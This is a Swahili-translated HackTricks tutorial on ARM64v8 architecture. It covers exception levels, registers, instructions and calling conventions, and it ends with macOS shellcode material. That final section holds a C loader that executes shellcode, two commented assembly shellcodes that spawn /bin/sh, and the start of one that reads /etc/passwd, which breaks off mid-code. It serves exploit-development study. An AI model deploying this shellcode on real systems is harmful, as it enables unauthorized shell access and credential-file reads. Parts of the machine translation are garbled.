# Utangulizi wa ARM64v8

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## **Viwango vya Kipekee - EL (ARM64v8)**

Katika usanifu wa ARMv8, viwango vya utekelezaji, vinavyojulikana kama Viwango vya Kipekee (ELs), vinadefinisha kiwango cha uwezo na uwezo wa mazingira ya utekelezaji. Kuna viwango vinne vya kipekee, kuanzia EL0 hadi EL3, kila kimoja kikitumika kwa kusudi tofauti:

1. **EL0 - Njia ya Mtumiaji**:
* Hii ni kiwango cha chini cha uwezo na hutumiwa kwa utekelezaji wa nambari za programu za kawaida.
* Programu zinazoendesha kwenye EL0 zimejitenga kutoka kila mmoja na kutoka kwa programu ya mfumo, kuimarisha usalama na utulivu.
2. **EL1 - Njia ya Msingi ya Mfumo wa Uendeshaji**:
* Zaidi ya mfumo wa uendeshaji wa msingi hufanya kazi kwenye kiwango hiki.
* EL1 ina uwezo zaidi kuliko EL0 na inaweza kupata rasilimali za mfumo, lakini kwa mipaka fulani ili kuhakikisha usalama wa mfumo.
3. **EL2 - Njia ya Hypervisor**:
* Kiwango hiki hutumiwa kwa utekelezaji wa kivinjari. Kivinjari kinachofanya kazi kwenye EL2 kinaweza kusimamia mifumo ya uendeshaji mingi (kila moja katika EL1 yake) inayofanya kazi kwenye vifaa vya kimwili sawa.
* EL2 hutoa huduma za kujitenga na kudhibiti mazingira yaliyovinjariwa.
4. **EL3 - Njia ya Monitor ya Salama**:
* Hii ni kiwango cha juu cha uwezo na mara nyingi hutumiwa kwa kuanzisha salama na mazingira ya utekelezaji yanayoweaminika.
* EL3 inaweza kusimamia na kudhibiti ufikiaji kati ya hali salama na zisizo salama (kama vile kuanzisha salama, OS iliyoaminika, nk).

Matumizi ya viwango hivi inaruhusu njia iliyopangwa na salama ya kusimamia vipengele tofauti vya mfumo, kutoka kwa programu za mtumiaji hadi programu ya mfumo yenye uwezo mkubwa zaidi. Njia ya ARMv8 ya viwango vya uwezo husaidia katika kujitenga kwa ufanisi sehemu tofauti za mfumo, hivyo kuimarisha usalama na nguvu ya mfumo.

## **Vidokezo (ARM64v8)**

ARM64 ina **registri 31 za kawaida**, zilizopewa majina `x0` hadi `x30`. Kila moja inaweza kuhifadhi thamani ya **biti 64** (baiti 8). Kwa operesheni zinazohitaji thamani za biti 32 tu, registri sawa zinaweza kufikiwa katika hali ya biti 32 kwa kutumia majina w0 hadi w30.

1. **`x0`** hadi **`x7`** - Kawaida hutumiwa kama registri za muda na kwa kusambaza parameta kwa subroutines.
* **`x0`** pia inabeba data ya kurudi ya kazi
2. **`x8`** - Katika kernel ya Linux, `x8` hutumiwa kama nambari ya wito wa mfumo kwa maelekezo ya `svc`. **Katika macOS x16 ndiyo inayotumiwa!**
3. **`x9`** hadi **`x15`** - Registri za muda zaidi, mara nyingi hutumiwa kwa ajili ya pembejeo za ndani.
4. **`x16`** na **`x17`** - **Registri za Wito za Ndani-Procedure**. Registri za muda kwa thamani za papo hapo. Pia hutumiwa kwa wito wa kazi zisizo za moja kwa moja na stubs za PLT (Procedure Linkage Table).
* **`x16`** hutumiwa kama **nambari ya wito wa mfumo** kwa maelekezo ya **`svc`** katika **macOS**.
5. **`x18`** - **Registri ya Jukwaa**. Inaweza kutumika kama registri ya kawaida, lakini kwenye majukwaa fulani, registri hii imehifadhiwa kwa matumizi maalum ya jukwaa: Kionjo cha kizuizi cha mazingira ya wakati wa sasa katika Windows, au kuashiria muundo wa kazi inayotekelezwa kwa sasa katika kernel ya Linux.
6. **`x19`** hadi **`x28`** - Hizi ni registri zilizohifadhiwa kwa wito. Kazi lazima ihifadhi thamani za registri hizi kwa mtumiaji wake, kwa hivyo zinahifadhiwa kwenye steki na kurejeshwa kabla ya kurudi kwa mtumiaji.
7. **`x29`** - **Registri ya Mwongozo wa Fremu** inayotumika kufuatilia fremu ya steki. Wakati fremu mpya ya steki inaundwa kwa sababu wito wa kazi umefanywa, **`x29`** inahifadhiwa kwenye steki na anwani mpya ya fremu (**anwani ya `sp`**) inahifadhiwa kwenye usajili huu.
* Usajili huu pia unaweza kutumika kama **usajili wa kawaida** ingawa kawaida hutumiwa kama kumbukumbu ya **pembejeo za ndani**.
8. **`x30`** au **`lr`**- **Usajili wa Kiungo**. Unashikilia anwani ya kurudi wakati maelekezo ya `BL` (Branch with Link) au `BLR` (Branch with Link to Register) yanatekelezwa kwa kuhifadhi thamani ya **`pc`** kwenye usajili huu.
* Pia unaweza kutumika kama usajili mwingine wowote.
9. **`sp`** - **Usajili wa Kionjo**, hutumiwa kufuatilia kilele cha steki.
* thamani ya **`sp`** lazima iwe angalau **quadword
### **PSTATE**

**PSTATE** ina sehemu kadhaa za mchakato zilizosanifishwa katika usajili maalum wa **`SPSR_ELx`** unaoweza kuonekana na mfumo wa uendeshaji, X ikiwa ni **kiwango cha ruhusa cha kosa** kilichosababisha (hii inaruhusu kurejesha hali ya mchakato wakati kosa linamalizika).\
Hizi ni sehemu zinazopatikana:

<figure><img src="../../../.gitbook/assets/image (724).png" alt=""><figcaption></figcaption></figure>

* **`N`**, **`Z`**, **`C`**, na **`V`** hali za hali:
* **`N`** inamaanisha uendeshaji ulitoa matokeo hasi
* **`Z`** inamaanisha uendeshaji ulitoa sifuri
* **`C`** inamaanisha uendeshaji ulibeba
* **`V`** inamaanisha uendeshaji ulitoa kipeo kilichosainiwa:
* Jumla ya nambari mbili chanya inatoa matokeo hasi.
* Jumla ya nambari mbili hasi inatoa matokeo chanya.
* Katika kutoa, wakati nambari kubwa hasi inaondolewa kutoka kwa nambari ndogo chanya (au kinyume chake), na matokeo hayawezi kuwakilishwa ndani ya upeo wa ukubwa wa biti uliopewa.

{% hint style="warning" %}
Sio maagizo yote yanayosasisha alama hizi. Baadhi kama **`CMP`** au **`TST`** hufanya hivyo, na wengine ambao wana kifupi cha s kama **`ADDS`** pia hufanya hivyo.
{% endhint %}

* Bendera ya sasa ya **urefu wa usajili (`nRW`)**: Ikiwa bendera inashikilia thamani 0, programu itaendeshwa katika hali ya utekelezaji wa AArch64 mara tu inapoendelea.
* **Kiango cha Kosa cha Sasa** (**`EL`**): Programu ya kawaida inayoendesha katika EL0 itakuwa na thamani 0
* Bendera ya **hatua moja** (**`SS`**): Inatumika na wadukuzi wa kuchunguza hatua moja kwa kuweka bendera ya SS kuwa 1 ndani ya **`SPSR_ELx`** kupitia kosa. Programu itaendesha hatua na kutoa kosa la hatua moja.
* Bendera ya hali ya kosa **isiyofaa** (**`IL`**): Inatumika kuashiria wakati programu yenye ruhusa inatekeleza uhamisho wa kiwango cha kosa usiofaa, bendera hii inawekwa kuwa 1 na kiprocessa kinasababisha kosa la hali isiyofaa.
* Bendera za **`DAIF`**: Bendera hizi huruhusu programu yenye ruhusa kuficha kwa hiari baadhi ya kosa za nje.
* Ikiwa **`A`** ni 1 inamaanisha **kukatika kwa ghafla** kutazinduliwa. **`I`** inaendeleza kujibu ombi za **Kuingilia za Vifaa vya Nje** (IRQs). na F inahusiana na **Ombi za Kuingilia za Haraka** (FIRs).
* Bendera za kuchagua za **chagua kidole cha staha** (**`SPS`**): Programu zenye ruhusa zinazoendesha katika EL1 na zaidi zinaweza kubadilishana kati ya kutumia usajili wao wa kidole cha staha na wa mfano wa mtumiaji (kwa mfano, kati ya `SP_EL1` na `EL0`). Hii inafanywa kwa kuandika kwenye usajili maalum wa **`SPSel`**. Hii haiwezi kufanywa kutoka EL0.

## **Mfumo wa Wito (ARM64v8)**

Mfumo wa wito wa ARM64 unabainisha kuwa **parameta nane za kwanza** kwa kazi hutumwa kwenye usajili **`x0`** hadi **`x7`**. **Parameta zaidi** hutumwa kwenye **staha**. Thamani ya **kurudi** inatumwa kwenye usajili **`x0`**, au pia kwenye **`x1`** ikiwa ina bits 128. Usajili wa **`x19`** hadi **`x30`** na **`sp`** lazima zihifadhiwe kati ya wito wa kazi.

Unaposoma kazi katika mkusanyiko, tafuta **prologue na epilogue** ya kazi. **Prologue** kawaida inahusisha **kuhifadhi kigezo cha fremu (`x29`)**, **kuweka** kigezo cha **fremu mpya**, na **kuweka nafasi ya staha**. **Epilogue** kawaida inahusisha **kurudisha kigezo cha fremu kilichohifadhiwa** na **kurudi** kutoka kwa kazi.

### Mfumo wa Wito katika Swift

Swift ina mfumo wake wa wito wa **kipekee** ambao unaweza kupatikana katika [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)

## **Maagizo ya Kawaida (ARM64v8)**

Maagizo ya ARM64 kwa ujumla yana **muundo wa `opcode dst, src1, src2`**, ambapo **`opcode`** ni **operesheni** itakayotekelezwa (kama vile `add`, `sub`, `mov`, nk), **`dst`** ni usajili wa **marudio** ambapo matokeo yatahifadhiwa, na **`src1`** na **`src2`** ni usajili wa **chanzo**. Thamani za moja kwa moja pia zinaweza kutumiwa badala ya usajili wa chanzo.

* **`mov`**: **Hamisha** thamani kutoka kwa **usajili** mmoja hadi mwingine.
* Mfano: `mov x0, x1` - Hii inahamisha thamani kutoka `x1` hadi `x0`.
* **`ldr`**: **Pakia** thamani kutoka **kumbukumbu** hadi **usajili**.
* Mfano: `ldr x0, [x1]` - Hii inapakia thamani kutoka eneo la kumbukumbu linaloelekezwa na `x1` hadi `x0`.
* **`str`**: **Hifadhi** thamani kutoka kwa **usajili** hadi **kumbukumbu**.
* Mfano: `str x0, [x1]` - Hii inahifadhi thamani katika `x0` kwenye eneo la kumbukumbu linaloelekezwa na `x1`.
* **`ldp`**: **Pakia Jozi ya Usajili**. Maagizo haya **yanapakia usajili mbili** kutoka kwa **eneo la kumbukumbu** lililopo mfululizo. Anwani ya kumbukumbu kawaida hufanywa kwa kuongeza mbadala kwa thamani katika usajili mwingine.
* Mfano: `ldp x0, x1, [x2]` - Hii inapakia `x0` na `x1` kutoka eneo la kumbukumbu kwenye `x2` na `x2 + 8
* **`bfm`**: **Bit Filed Move**, hizi operesheni **hukopi bits `0...n`** kutoka kwa thamani na kuziweka katika nafasi **`m..m+n`**. **`#s`** inabainisha nafasi ya **bit ya kushoto** na **`#r`** kiasi cha **kuzungusha kulia**.
* Hoja ya Bitfiled: `BFM Xd, Xn, #r`
* Hoja ya Bitfiled yenye Ishara: `SBFM Xd, Xn, #r, #s`
* Hoja ya Bitfiled isiyo na Ishara: `UBFM Xd, Xn, #r, #s`
* **Kuchukua na Kuingiza Bitfield:** Hukopi bitfield kutoka kwenye usajili na kuziweka kwenye usajili mwingine.
* **`BFI X1, X2, #3, #4`** Weka bits 4 kutoka X2 kutoka bit ya 3 ya X1
* **`BFXIL X1, X2, #3, #4`** Chukua kutoka bit ya 3 ya X2 bits nne na uzihifadhi kwenye X1
* **`SBFIZ X1, X2, #3, #4`** Inapanua ishara ya bits 4 kutoka X2 na kuziweka kwenye X1 kuanzia nafasi ya bit 3 na kuzifanya bits za kulia kuwa sifuri
* **`SBFX X1, X2, #3, #4`** Inachukua bits 4 kuanzia bit ya 3 kutoka X2, inapanua ishara yao, na kuweka matokeo kwenye X1
* **`UBFIZ X1, X2, #3, #4`** Inapanua sifuri ya bits 4 kutoka X2 na kuziweka kwenye X1 kuanzia nafasi ya bit 3 na kuzifanya bits za kulia kuwa sifuri
* **`UBFX X1, X2, #3, #4`** Inachukua bits 4 kuanzia bit ya 3 kutoka X2 na kuweka matokeo ya sifuri kwenye X1.
* **Panua Ishara Kwenda X:** Inapanua ishara (au kuongeza tu sifuri katika toleo lisilo na ishara) ya thamani ili kuweza kufanya operesheni nayo:
* **`SXTB X1, W2`** Inapanua ishara ya byte **kutoka W2 hadi X1** (`W2` ni nusu ya `X2`) ili kujaza bits 64
* **`SXTH X1, W2`** Inapanua ishara ya nambari ya 16bit **kutoka W2 hadi X1** ili kujaza bits 64
* **`SXTW X1, W2`** Inapanua ishara ya byte **kutoka W2 hadi X1** ili kujaza bits 64
* **`UXTB X1, W2`** Inaongeza sifuri (isio na ishara) kwa byte **kutoka W2 hadi X1** ili kujaza bits 64
* **`extr`:** Inachukua bits kutoka kwa **jozi ya usajili uliyounganishwa**.
* Mfano: `EXTR W3, W2, W1, #3` Hii ita**unganisha W1+W2** na kupata **kutoka bit ya 3 ya W2 hadi bit ya 3 ya W1** na kuihifadhi kwenye W3.
* **`bl`**: **Branch** na kiungo, hutumiwa ku**ita** **sehemu ndogo**. Inahifadhi **anwani ya kurudi katika `x30`**.
* Mfano: `bl myFunction` — Hii inaita kazi `myFunction` na kuhifadhi anwani ya kurudi katika `x30`.
* **`blr`**: **Branch** na Kiungo kwenda Usajili, hutumiwa ku**ita** **sehemu ndogo** ambapo lengo lime**bainishwa** katika **usajili**. Inahifadhi anwani ya kurudi katika `x30`.
* Mfano: `blr x1` — Hii inaita kazi ambayo anwani yake iko katika `x1` na kuhifadhi anwani ya kurudi katika `x30`.
* **`ret`**: **Kurudi** kutoka kwa **sehemu ndogo**, kawaida kwa kutumia anwani katika **`x30`**.
* Mfano: `ret` — Hii inarudi kutoka kwa sehemu ndogo ya sasa kwa kutumia anwani ya kurudi katika `x30`.
* **`cmp`**: **Hilinganisha** usajili mbili na kuweka alama za hali. Ni **jina mbadala la `subs`** ambayo inaweka usajili wa marudio kuwa usajili wa sifuri. Inafaa kujua kama `m == n`.
* Inasaidia **sintaksia ile ile kama `subs`**
* Mfano: `cmp x0, x1` — Hii inalinganisha thamani katika `x0` na `x1` na kuweka alama za hali kulingana na hilo.
* **`cmn`**: **Hilinganisha** hasi ya **operandi**. Katika kesi hii ni **jina mbadala la `adds`** na inasaidia sintaksia ile ile. Inafaa kujua kama `m == -n`.
* **tst**: Inachunguza ikiwa thamani yoyote ya usajili ni 1 (inafanya kazi kama ANDS bila kuhifadhi matokeo mahali popote)
* Mfano: `tst X1, #7` Angalia ikiwa moja ya bits za mwisho 3 za X1 ni 1
* **`b.eq`**: **Branch if equal**, kulingana na maagizo ya `cmp` ya awali.
* Mfano: `b.eq label` — Ikiwa maagizo ya `cmp` ya awali yalipata thamani mbili sawa, hii inaruka hadi `label`.
* **`b.ne`**: **Branch if Not Equal**. Maagizo haya yanachunguza alama za hali (ambazo ziliwekwa na maagizo ya kulinganisha ya awali), na ikiwa thamani zilizolinganishwa hazikuwa sawa, inaruka hadi lebo au anwani.
* Mfano: Baada ya maagizo ya `cmp x0, x1`, `b.ne label` — Ikiwa thamani katika `x0` na `x1` hazikuwa sawa, hii inaruka hadi `label`.
* **`cbz`**: **Compare and Branch on Zero**. Maagizo haya yanalinganisha usajili na sifuri, na ikiwa ni sawa, inaruka hadi lebo au anwani.
* Mfano: `cbz x0, label` — Ikiwa thamani katika `x0` ni sifuri, hii inaruka hadi `label`.
* **`cbnz`**: **Compare and Branch on Non-Zero**. Maagizo haya yanalinganisha usajili na sifuri, na ikiwa hazilingani, inaruka hadi lebo au anwani.
* Mfano: `cbnz x0, label` — Ikiwa thamani katika `x0` sio sifuri, hii inaruka hadi `label`.
* **`adrp`**: Hesabu **anwani ya ukurasa wa ishara** na kuihifadhi katika usajili.
* Mfano: `adrp x0, symbol` — Hii inahesabu anwani ya ukurasa wa `symbol` na kuihifadhi katika `x0`.
* **`ldrsw`**: **Pakia** thamani ya **32-bit** yenye ishara kutoka kumbukumbu na **kuipanua ishara hadi 64** bits.
* Mfano: `ldrsw x0, [x1]` — Hii inapakia thamani ya 32-bit yenye ishara kutoka kwenye eneo la kumbukumbu linaloelekezwa na `x1`, inaipanua ishara hadi 64 bits, na kuihifadhi katika `x0`.
* **`stur`**: **Hifadhi thamani ya usajili kwenye eneo la kumbukumbu**, kwa kutumia mbadala kutoka kwa usajili mwingine.
* Mfano: `stur x0, [x1, #4]` — Hii inahifadhi thamani katika `x0` kwenye anwani ya kumbukumbu ambayo ni byte 4 zaidi ya anwani iliyopo katika `x1`.
* **`svc`** : Fanya **wito wa mfumo**. Inasimama kwa "Supervisor Call". Wakati processor inatekeleza maagizo haya, inafanya **ubadilishaji kutoka hali ya
### **Utangulizi wa Kazi**

1. **Hifadhi rekodi ya kiungo na kipima cha fremu kwenye steki**:

{% code overflow="wrap" %}
```armasm
stp x29, x30, [sp, #-16]!  ; hifadhi jozi ya x29 na x30 kwenye steki na punguza kipima cha steki
```
{% endcode %}
2. **Sanidi kipima kipya cha fremu**: `mov x29, sp` (inasanidi kipima kipya cha fremu kwa kazi ya sasa)
3. **Tenga nafasi kwenye steki kwa ajili ya pembejeo za ndani** (ikiwa inahitajika): `sub sp, sp, <ukubwa>` (ambapo `<ukubwa>` ni idadi ya bayti zinazohitajika)

### **Hitimisho la Kazi**

1. **Futa pembejeo za ndani (ikiwa zilitengwa)**: `add sp, sp, <ukubwa>`
2. **Rejesha rekodi ya kiungo na kipima cha fremu**:

{% code overflow="wrap" %}
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
{% endcode %}

3. **Kurudi**: `ret` (inarejesha udhibiti kwa mtu anayetoa wito kwa kutumia anwani katika daftari la viungo)

## Hali ya Utekelezaji wa AARCH32

Armv8-A inasaidia utekelezaji wa programu za biti 32. **AArch32** inaweza kukimbia katika moja ya **seti mbili za maagizo**: **`A32`** na **`T32`** na inaweza kubadilisha kati yao kupitia **`interworking`**.\
Programu za **64-bit** zenye **mamlaka** zinaweza kupanga **utekelezaji wa programu za biti 32** kwa kutekeleza uhamisho wa kiwango cha kipekee kwenda kwa biti 32 zenye mamlaka ya chini.\
Tambua kuwa mpito kutoka kwa biti 64 kwenda kwa biti 32 hufanyika na kiwango cha kipekee cha chini (kwa mfano, programu ya biti 64 katika EL1 inayosababisha programu katika EL0). Hii inafanywa kwa kuweka **biti 4 ya** **`SPSR_ELx`** daftari maalum **kuwa 1** wakati mchakato wa mchakato wa `AArch32` uko tayari kutekelezwa na sehemu iliyobaki ya `SPSR_ELx` inahifadhi programu za **`AArch32`** CPSR. Kisha, mchakato wenye mamlaka huita maagizo ya **`ERET`** ili mchakato uhamie kwa **`AArch32`** kuingia katika A32 au T32 kulingana na CPSR**.**

**`Interworking`** inafanyika kwa kutumia biti za J na T za CPSR. `J=0` na `T=0` inamaanisha **`A32`** na `J=0` na `T=1` inamaanisha **T32**. Hii kimsingi inamaanisha kuweka **biti ya chini kuwa 1** kuonyesha kuwa seti ya maagizo ni T32.\
Hii inawekwa wakati wa maagizo ya matawi ya **interworking**, lakini pia inaweza kuwekwa moja kwa moja na maagizo mengine wakati PC inawekwa kama daftari la marudio. Mfano:

Mfano mwingine:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Virejista

Kuna virejista 16 vya biti 32 (r0-r15). Kutoka r0 hadi r14 wanaweza kutumika kwa operesheni yoyote, hata hivyo baadhi yao kawaida hutengwa:

* `r15`: Kumbukumbu ya programu (daima). Ina anwani ya maagizo yanayofuata. Katika A32, sasa + 8, katika T32, sasa + 4.
* `r11`: Kumbukumbu ya fremu
* `r12`: Kumbukumbu ya wito wa ndani wa taratibu
* `r13`: Kumbukumbu ya mstari wa mstari
* `r14`: Kumbukumbu ya kiungo

Zaidi ya hayo, virejista hurejeshwa katika virejista vilivyohifadhiwa. Ambavyo ni sehemu ambazo hifadhi thamani za virejista kuruhusu kubadilisha muktadha haraka katika kushughulikia kwa kushughulikia kwa kushughulikia na operesheni za kibali ili kuepuka haja ya kuokoa na kurejesha virejista kwa mkono kila wakati. Hii inafanywa kwa kuhifadhi hali ya mchakato kutoka kwa CPSR hadi SPSR ya hali ya mchakato ambayo kosa linachukuliwa. Wakati kosa linarudi, CPSR inarejeshwa kutoka SPSR.

### CPSR - Usajili wa Hali ya Programu ya Sasa

Katika AArch32, CPSR inafanya kazi kama PSTATE katika AArch64 na pia imehifadhiwa katika SPSR_ELx wakati kosa linachukuliwa ili kurejesha baadaye utekelezaji:

<figure><img src="../../../.gitbook/assets/image (725).png" alt=""><figcaption></figcaption></figure>

Sehemu zimegawanywa katika vikundi kadhaa:

* Usajili wa Hali ya Programu ya Maombi (APSR): Bendera za hisabati na zinaweza kufikiwa kutoka EL0
* Usajili wa Hali ya Utekelezaji: Tabia ya mchakato (inayosimamiwa na OS).

#### Usajili wa Hali ya Programu ya Maombi (APSR)

* Bendera za `N`, `Z`, `C`, `V` (kama vile katika AArch64)
* Bendera ya `Q`: Inawekwa kuwa 1 wakati unapotokea **kuzidi kwa nambari ya kiasi** wakati wa utekelezaji wa maagizo ya hisabati ya kujaza. Mara ilipo wekwa kuwa **1**, itaendelea kuwa na thamani hiyo hadi itakapowekwa kuwa 0 kwa mkono. Zaidi ya hayo, hakuna maagizo yoyote yanayochunguza thamani yake kwa njia ya siri, lazima ichunguzwe kwa kuisoma kwa mkono.
* Bendera za `GE` (Kubwa au sawa): Hutumiwa katika operesheni za SIMD (Maagizo Moja, Data Nyingi), kama vile "kuongeza kwa pamoja" na "kupunguza kwa pamoja". Operesheni hizi huruhusu kusindika alama nyingi za data katika maagizo moja.

Kwa mfano, maagizo ya `UADD8` yanaongeza jozi nne za herufi (kutoka kwa waendeshaji wawili wa biti 32) kwa pamoja na kuhifadhi matokeo katika usajili wa biti 32. Kisha inaweka bendera za `GE` katika `APSR` kulingana na matokeo haya. Kila bendera ya GE inalingana na moja ya kuongezwa kwa herufi, ikionyesha ikiwa kuongezwa kwa jozi hiyo ya herufi kumefurika.

Maagizo ya `SEL` hutumia bendera hizi za GE kutekeleza hatua za masharti.

#### Usajili wa Hali ya Utekelezaji

* Biti za `J` na `T`: `J` inapaswa kuwa 0 na ikiwa `T` ni 0, seti ya maagizo ya A32 hutumiwa, na ikiwa ni 1, seti ya maagizo ya T32 hutumiwa.
* Usajili wa Hali ya Bloki ya IT (`ITSTATE`): Hizi ni biti kutoka 10-15 na 25-26. Huhifadhi hali za maagizo ndani ya kikundi kilicho na kipimo cha `IT`.
* Biti ya `E`: Inaonyesha utaratibu wa kumalizia.
* Biti za Njia na Kizuizi cha Kosa (0-4): Zinaamua hali ya sasa ya utekelezaji. Ya tano inaonyesha ikiwa programu inaendeshwa kama 32bit (1) au 64bit (0). Nne zingine zinaonyesha hali ya kosa inayotumiwa wakati kosa linatokea na linashughulikiwa. Nambari iliyowekwa inaonyesha kipaumbele cha sasa ikiwa kosa lingine litasababishwa wakati huu unashughulikiwa.

<figure><img src="../../../.gitbook/assets/image (728).png" alt=""><figcaption></figcaption></figure>

* `AIF`: Baadhi ya makosa yanaweza kuzimwa kwa kutumia biti za `A`, `I`, `F`. Ikiwa `A` ni 1, inamaanisha makosa ya kusumbua yatasababishwa. `I` inaunda jibu kwa ombi za vifaa vya nje vya kuingilia (IRQs). na F inahusiana na Ombi za Kuingilia Kwa Kasi (FIRs).

## macOS

### Wito wa BSD

Angalia [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master). Wito wa BSD utakuwa na **x16 > 0**.

### Mach Traps

Angalia [**syscall\_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall\_sw.c.auto.html). Mach traps watakuwa na **x16 < 0**, kwa hivyo unahitaji kuita nambari kutoka kwa orodha ya awali na ishara ya chini: **`_kernelrpc_mach_vm_allocate_trap`** ni **`-10`**.

Unaweza pia kuangalia **`libsystem_kernel.dylib`** katika disassembler ili kupata jinsi ya kuita hizi (na BSD) syscalls:
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
{% hint style="success" %}
Maranyingi ni rahisi kuangalia **msimbo uliopanguliwa** kutoka **`libsystem_kernel.dylib`** **kuliko** kuangalia **msimbo wa chanzo** kwa sababu msimbo wa wito wa syscalls kadhaa (BSD na Mach) unazalishwa kupitia hati (angalia maoni katika msimbo wa chanzo) wakati katika dylib unaweza kupata kinachoitwa.
{% endhint %}

### Shellcodes

Kwa kuchapisha:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Kuondoa herufi:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
<details>

<summary>Msimbo wa C kwa ajili ya kujaribu shellcode</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Imechukuliwa kutoka [**hapa**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s) na kufafanuliwa.

{% tabs %}
{% tab title="na adr" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{% tab title="na stack" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{% endtab %}
{% endtabs %}

#### Soma na cat

Lengo ni kutekeleza `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, kwa hivyo hoja ya pili (x1) ni safu ya vigezo (ambavyo kumbukumbu inamaanisha rundo la anwani).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
